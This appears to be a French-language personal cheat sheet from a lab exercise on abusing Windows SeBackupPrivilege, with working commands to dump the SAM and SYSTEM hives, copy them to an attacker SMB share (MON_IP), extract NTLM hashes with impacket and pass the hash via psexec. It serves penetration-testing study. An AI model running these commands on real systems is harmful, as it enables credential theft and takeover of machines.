---
technique: "SeBackupPrivilege"
os: Windows
categorie: PrivEsc
tags: [technique, privesc, windows, token, credentials]
rooms: []
---

# SeBackupPrivilege

## Principe
> `SeBackupPrivilege` permet de **lire n'importe quel fichier** en contournant la DACL (pour faire des sauvegardes). On l'utilise pour copier les hives **SAM** et **SYSTEM**, puis extraire le hash NTLM de l'Administrateur local → crack ou pass-the-hash.

## Point clé (vécu)
> Le privilège existe mais n'est **pas activé** dans un shell lancé normalement → `reg save` renvoie `Access denied` / `A required privilege is not held`. Il faut l'**activer dans le shell courant, avant** la commande.

## Exploitation
```powershell
# 1. Activer le privilège (modules fournis dans la room)
Import-Module C:\...\SeBackupPrivilegeUtils.dll
Import-Module C:\...\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege
Get-SeBackupPrivilege        # doit dire "enabled"

# 2. Sauvegarder les hives
reg save hklm\system system.hive
reg save hklm\sam sam.hive
# (ou, si reg save refuse encore :)
Copy-FileSeBackupPrivilege C:\Windows\System32\config\SYSTEM system.hive
Copy-FileSeBackupPrivilege C:\Windows\System32\config\SAM sam.hive

# 3. Vérifier qu'ils ne sont PAS vides (piège : 0 octet = reg save a échoué)
dir *.hive
```
```cmd
:: 4. Transférer vers Kali (SMB)
copy system.hive \\MON_IP\public\
copy sam.hive \\MON_IP\public\
```
```bash
# 5. Kali : serveur SMB + extraction
python3.9 /opt/impacket/examples/smbserver.py -smb2support -username x -password y public share
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
# → ligne Administrator:500:LM:NTLM:::
```

## Pass-the-Hash
```bash
python3.9 /opt/impacket/examples/psexec.py -hashes LM:NTLM Administrator@IP_CIBLE
```

## Pièges vécus
- Nouveau shell = privilège **désactivé** → refaire Import-Module + Set-SeBackupPrivilege.
- Fichiers `.hive` à **0 octet** = `reg save` a échoué (privilège pas actif).
- Les hives transférés arrivent dans le **dossier partagé** (`share/`), pas dans `/root`.
- impacket : conflits de version Python fréquents → tout faire tourner sous **un seul Python ≥ 3.9**.

## Remédiation
- Ne pas accorder SeBackupPrivilege à des comptes non-admin.
